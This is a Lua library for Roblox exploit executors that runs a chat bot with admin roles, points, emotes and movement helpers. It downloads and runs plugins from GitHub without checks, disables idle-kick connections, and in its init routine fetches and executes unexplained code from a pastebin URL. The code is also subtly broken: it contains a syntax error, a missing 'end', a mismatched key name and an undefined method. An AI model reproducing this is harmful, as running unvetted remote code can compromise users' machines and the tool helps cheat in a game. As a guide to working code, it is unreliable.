
local CB_Manager = {
    ['StandardFolder'] = "CBM-CONFIG",
    ['fileExtension'] = "lua",
    ['Client'] = game:GetService("Players").LocalPlayer
}

CB_Manager._index = CB_Manager



if syn and DrawingImmediate then
    CB_Manager['fileExtension'] = "txt"
end
local fileExLen = #CB_Manager['fileExtension'] + 1

function CB_Manager:Configuration(options)
    local config = options or {}
    local s_self = {}
    setmetatable(s_self, CB_Manager)
    s_self.prefix = config['prefix']
    s_self.bot = config['bot']
    s_self.owner = config['owner']
    s_self.admins = config['admins']
    s_self.mods = config['mods']
    s_self.points = config['points']
    s_self.configName = config['config_name']
    s_self.plugins = {}
    s_self.commands = {}

    if not isfolder(CB_Manager['StandardFolder']) then
        makefolder(CB_Manager['StandardFolder'])
    end

    if not isfolder(CB_Manager['StandardFolder'] .. "/saved_configs") then
        makefolder(CB_Manager['StandardFolder'] .. "/saved_configs")
        writefile(CB_Manager['StandardFolder'] .. "/saved_configs/" .. s_self.configName .. ".txt",
            game:GetService("HttpService"):JSONEncode(s_self))
    else
        if isfolder(CB_Manager['StandardFolder'] .. "/saved_configs") then
            writefile(CB_Manager['StandardFolder'] .. "/saved_configs/" .. s_self.configName .. ".txt",
                game:GetService("HttpService"):JSONEncode(s_self))
        end
    end

    if not isfolder(CB_Manager['StandardFolder'] .. "/saved_admins") then
        makefolder(CB_Manager['StandardFolder'] .. "/saved_admins")
        for i, v in pairs(s_self.admins) do
            writefile(CB_Manager['StandardFolder'] .. "/saved_admins/" .. v .. ".txt", "This player is a admin.")
        end
    end

    if not isfolder(CB_Manager['StandardFolder'] .. "/saved_mods") then
        makefolder(CB_Manager['StandardFolder'] .. "/saved_mods")
        for i, v in pairs(s_self.mods) do
            writefile(CB_Manager['StandardFolder'] .. "/saved_mods/" .. v .. ".txt", "This player is a mod.")
        end
    end

    if not isfolder(CB_Manager['StandardFolder'] .. "/saved_owner") then
        makefolder(CB_Manager['StandardFolder'] .. "/saved_owner")
        writefile(CB_Manager['StandardFolder'] .. "/saved_owner/" .. s_self.owner .. ".txt", "This player is the owner.")
    end
    if not isfolder(CB_Manager['StandardFolder'] .. "/saved_plugins") then
        makefolder(CB_Manager['StandardFolder'] .. "/saved_plugins")
    end
    --warn('Saved Config')
    --warn('Check on file: ' .. CB_Manager['StandardFolder'])
    return s_self
end

function CB_Manager:requestGET(url)
    local rhttp = game:GetService('HttpService')
    local req = syn and syn.request or http and http.request or http_request or fluxus and fluxus.request or
                    getgenv().request or request
    if req then
        local response = req({
            Url = url,
            Method = 'GET'
        })
        return response.Body
    else
        warn("CBM | PluginDownloader Exploit does not support request. This plugin will not work.")
    end
end

function CB_Manager:getFileName(attemptName, RAW)
    local fileName
    if attemptName then
        if attemptName:sub(-fileExLen) == '.' .. CB_Manager['fileExtension'] then
            fileName = attemptName
        else
            fileName = attemptName .. '.' .. CB_Manager['fileExtension']
        end
        if not isfile(CB_Manager['StandardFolder'] .. "/saved_plugins/" .. fileName) then
            return fileName
        else
            warn("CBM | PluginDownloader Provided file name already exists.")
        end
    else
        fileName = loadstring(RAW)().PluginName .. "." .. CB_Manager['fileExtension']
        if not isfile(CB_Manager['StandardFolder'] .. "/saved_plugins/" .. fileName) then
            return fileName
        end
        repeat
            fileName = CB_Manager:randomStringP() .. "." .. CB_Manager['fileExtension']
        until not isfile(CB_Manager['StandardFolder'] .. "/saved_plugins/" .. fileName)
        return fileName
    end
end

function CB_Manager:randomStringP()
    local min, max, final = ("A"):byte(), ("Z"):byte(), "CBMPluginDownloader-"
    for i = 1, math.random(5, 10) do
        final = final .. string.char(math.random(min, max))
    end
    return final
end

function CB_Manager:downloadPlugin(plugin)
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    local url = "https://raw.githubusercontent.com/Zirmith/CB-Manager/main/Plugins/" .. plugin .. '.lua'
        if not plugin then
            warn("CBM | PluginDownloader Plugin not specified.")
        end
        local pluginRaw = CB_Manager:requestGET(url)
        local pluginName = CB_Manager:getFileName(plugin, pluginRaw)
        writefile(CB_Manager['StandardFolder'] .. "/saved_plugins/" .. pluginName, pluginRaw)
        warn("CBM | PluginDownloader Saved plugin as " .. pluginName)
end

function CB_Manager:addCommand(command, options)
    local json;
    local https = game:GetService 'HttpService'
    if not command then
        warn("CBM | CommandHandler Command not specified.")
    end
    if command then
        local core = options or {}
        local setup = {
            ['Command'] = command,
            ['execute'] = core['execute']
        }
        json = https:JSONEncode(setup)
        if not isfolder(CB_Manager['StandardFolder'] .. "/saved_commands") then
            makefolder(CB_Manager['StandardFolder'] .. "/saved_commands")
            writefile(CB_Manager['StandardFolder'] .. "/saved_commands/" .. command .. ".lua", json, null, 2)
            warn('Saved command: '..command)
        end
    end
end

function CB_Manager:runPlugin(plugin, options)
    if not game:IsLoaded() then
        game.Loaded:Wait()
    end
    local ci = options or {}
    local path = CB_Manager['StandardFolder'] .. "/saved_plugins/" .. plugin .. '.lua'
    if not plugin then
        warn("CBM | PluginDownloader Plugin not specified.")
    end
    local func = loadstring(readfile(path))()
    pcall(plugin,
        func['Commands'](ci['args1'],ci['args2'])
    )
    warn("CBM | PluginDownloader Ran plugin: " .. plugin)
end

function CB_Manager:init(config)
    local c1 = config
    local self = {}
    self.Name = c1['bot']
    self.Owner = c1['owner']
    self.prefix = c1['prefix']
    self.mods = c1['mods']
    self.admins = c1['admins']
    self.plugins = config['plugins']
    self.commands = config['commands']
    self.starting_points = config['points']
    self.homepos = nil

    for i,v in pairs(self.plugins) do
        CB_Manager:downloadPlugin(v)
    end

    if not config['plugins'] then
        self.plugins = {}
    end

    if not config['commands'] then
        self.commands = {}
    end

    function self:usePlugin(p,a,b)
        CB_Manager:runPlugin(p, {
            ['args1'] = a,
            ['args2'] = b
        })
    end

    function self:getPlugin(p)
        CB_Manager:downloadPlugin(p)
        return p
    end

   function self:setPoints(user,amount)
    writefile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(user)..".txt", game:GetService("HttpService"):JSONEncode(tonumber(amount)))
   end

   function self:getPoints(user)
    if isfile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(user)..".txt") then
		return tonumber(readfile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(user)..".txt"))
	end
   end

   function self:givePoints(user,amount)
    if isfile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(user)..".txt") then
		Original = self:ReturnPoints(user)
		writefile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(user)..".txt", game:GetService("HttpService"):JSONEncode(tonumber(Original+amount)))
	end
   end

   function self:removePoints(user,amount)
    if isfile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(user)..".txt") then
		Original = self:ReturnPoints(user)
		writefile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(user)..".txt", game:GetService("HttpService"):JSONEncode(tonumber(Original-amount)))
	end
   end

   function self:clearPoints(user)
    if isfile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(user)..".txt") then
		writefile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(user)..".txt", 0)
	end
   end

   if not game:IsLoaded() then
    game.Loaded:Wait()
end
repeat
    task.wait()
until game:GetService("Players") and game:GetService("Workspace") and game:GetService("ReplicatedStorage") and
    game:GetService("UserInputService")

    for i,v in ipairs(game:GetService("Players"):GetPlayers()) do
    	if table.find(self.admins, v.Name) then
    		writefile( CB_Manager['StandardFolder'] .."/saved_points/"..tostring(v)..".txt", game:GetService("HttpService"):JSONEncode(100000))
    	else
			writefile( CB_Manager['StandardFolder'] .."/saved_points/"..tostring(v)..".txt", game:GetService("HttpService"):JSONEncode(self.starting_points))
		end
    Gamble = Instance.new("NumberValue", v)
    Gamble.Name = "Gamble"
    Gamble.Value = 0

    Work = Instance.new("NumberValue", v)
    Work.Name = "Work"
    Work.Value = 0
end

    game:GetService("Players").PlayerAdded:Connect(function(player)
        if not isfile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(player)..".txt") then
            writefile(CB_Manager['StandardFolder'] .."/saved_points/"..tostring(player)..".txt", game:GetService("HttpService"):JSONEncode(self.starting_points))
        end
        Gamble = Instance.new("NumberValue", player)
        Gamble.Name = "Gamble"
        Gamble.Value = 0

        Work = Instance.new("NumberValue", player)
        Work.Name = "Work"
        Work.Value = 0
    end)

local LocalPlayer = game:GetService("Players").LocalPlayer
loadstring(game:HttpGet("https://pastebin.com/raw/tUUGAeaH", true))()

for i, connection in pairs(getconnections(LocalPlayer.Idled)) do
	connection:Disable()
end

function self:returnHRP()
    if not CB_Manager['client'].Character then
        return
    end
    if not CB_Manager['client'].Character:FindFirstChild("HumanoidRootPart") then
        return
    else
        return CB_Manager['client'].Character:FindFirstChild("HumanoidRootPart")
end

function self:returnHUM()
    if not CB_Manager['client'].Character then
        return
    end
    if not CB_Manager['client'].Character:FindFirstChild("Humanoid") then
        return
    else
        return CB_Manager['client'].Character:FindFirstChild("Humanoid")
    end
end

repeat
    task.wait()
until self:returnHRP() and self:returnHUM()


function self:warp(time, pos) -- tiny tween
    game:GetService('TweenService'):Create(self:returnHRP(),
        TweenInfo.new(time, Enum.EasingStyle.Elastic, Enum.EasingDirection.In), {
            -- CFrame = pos + Vector3.new(0, 2, 0)
            CFrame = pos + Vector3.new(0, 2, 0)
         }):Play()
    task.wait(time)
end

function self:Dance()
    ChatMain = require(LocalPlayer.PlayerScripts.ChatScript.ChatMain)
    ChatMain.MessagePosted:fire("/e dance" .. tostring(math.random(1, 3)))
end

function self:Cheer()
    ChatMain = require(LocalPlayer.PlayerScripts.ChatScript.ChatMain)
    ChatMain.MessagePosted:fire("/e cheer")
end

function self:Point()
    ChatMain = require(LocalPlayer.PlayerScripts.ChatScript.ChatMain)
    ChatMain.MessagePosted:fire("/e point")
end

function self:Laugh()
    ChatMain = require(LocalPlayer.PlayerScripts.ChatScript.ChatMain)
    ChatMain.MessagePosted:fire("/e laugh")
end

function self:Yay()
    ChatMain = require(LocalPlayer.PlayerScripts.ChatScript.ChatMain)
    ChatMain.MessagePosted:fire("/e yay")
end

function self:setHome()
    self.homepos = self:returnHRP().CFrame
end

function self:getHome()
    return self.homepos
end

function self:toHome()
   self:warp(.2, self.homepos)
end

function self:Jump()
    self:returnHUM():ChangeState(3)
end
function self:Die()
    self:returnHUM().Health = 0
end

self:Loops = {}

    return self
end



getgenv().CB_Manager = CB_Manager

return getgenv().CB_Manager

--tawhid
